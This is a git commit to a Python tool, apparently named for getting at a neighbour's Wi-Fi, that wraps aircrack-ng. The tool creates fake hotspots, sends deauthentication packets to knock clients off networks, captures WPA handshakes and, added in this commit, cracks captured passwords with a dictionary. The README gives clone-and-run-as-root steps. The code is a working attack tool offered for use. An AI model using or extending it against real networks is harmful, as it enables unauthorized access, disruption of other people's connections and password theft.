362dc287ee6c2d4437cd2b31dbe1430601fc1588
Man1nHat <popryvoon100@gmail.com>
2018-07-07 11:59:17 +0000

    Added command decode and upgraded other commands

--- README.md
+++ README.md
@@ -1,9 +1,23 @@
-!!RUN THIS PROGRAM AS ROOT!!
-Depencies:
+For run this program open terminal and type:
+
+git clone https://gitlab.com/Man1nHat/kak-dostat-soseda.git
+
+cd kak-dostat-soseda
+
+sudo python kak-dostat-soseda.py
+
+Dependencies:
+
+aircrack-ng
+
 python 3
+
 konsole
 
+linux
+
 Commands:
+
 fake-hot-spot - this command is used to create fake hot spot
 
 deauth - this command is used to send deauth packets and disconnect clients
@@ -11,3 +25,5 @@ deauth - this command is used to send deauth packets and disconnect clients
 deauth-client - this command is used to send deauth packets and disconnect client
 
 hack - this command is used to get handshake.
+
+decode - this command can decode .cap password using dictionary
--- kak-dostat-soseda.py
+++ kak-dostat-soseda.py
@@ -2,15 +2,22 @@ from subprocess import *
 
 try:
     answ = input("-> ")
+
+    if answ == "decode":
+        dictionary = input("-> Enter dictionary path: ")
+        mac = input("-> Enter router mac: ")
+        cap = input("-> Enter .cap file path:")
+        call(["aircrack-ng", "-a2", "-b", mac, "-w", dictionary, cap])
+
     if answ == "fake-hot-spot":
         name = input("-> Enter name of fake wifi hot spot: ")
         mac = input("-> Enter mac address of fake wifi hot spot: ")
         ch = input("-> Enter channel number of fake wifi hot spot: ")
-        call(["iwconfig"])
+        call(["airmon-ng"])
         adapter = input("-> Enter name of your network adapter: ")
         call(["airmon-ng", "start", adapter])
         adapter = adapter + "mon"
-        call(["airbase-ng", "-a", mac, "--essid", name, "-c", ch, adapter])
+        cmd = ["airbase-ng", "-a", mac, "--essid", name, "-c", ch, adapter]
 
     if answ == "deauth-client":
         call(["airmon-ng"])
@@ -21,7 +28,7 @@ try:
         call(["iwconfig", adapter, "channel", ch])
         name = input("-> Enter deauth essid: ")
         client = input("-> Enter deauth client mac: ")
-        call(["aireplay-ng", "-0", "0", "-e", name, "-c", client,  adapter])
+        call(["aireplay-ng", "-0", "0", "-e", name, "-c", client, adapter])
 
     if answ == "deauth":
         call(["airmon-ng"])
@@ -31,7 +38,7 @@ try:
         adapter = adapter + "mon"
         call(["iwconfig", adapter, "channel", ch])
         name = input("-> Enter deauth essid: ")
-        call(["aireplay-ng", "-0", "0", "-e", name,  adapter])
+        call(["aireplay-ng", "-0", "0", "-e", name, adapter])
 
     if answ == "hack":
         call(["airmon-ng"])
@@ -41,7 +48,7 @@ try:
         name = input("-> Enter target essid: ")
         adapter = adapter + "mon"
         call(["iwconfig", adapter, "channel", ch])
-        call(["konsole", "-e", "sudo", "aireplay-ng", "-0", "15", "-e", name,  adapter])
+        call(["konsole", "-e", "sudo", "aireplay-ng", "-0", "15", "-e", name, adapter])
         call(["airodump-ng", adapter, "--channel", ch, "-w", "password"])
 
 except KeyboardInterrupt:
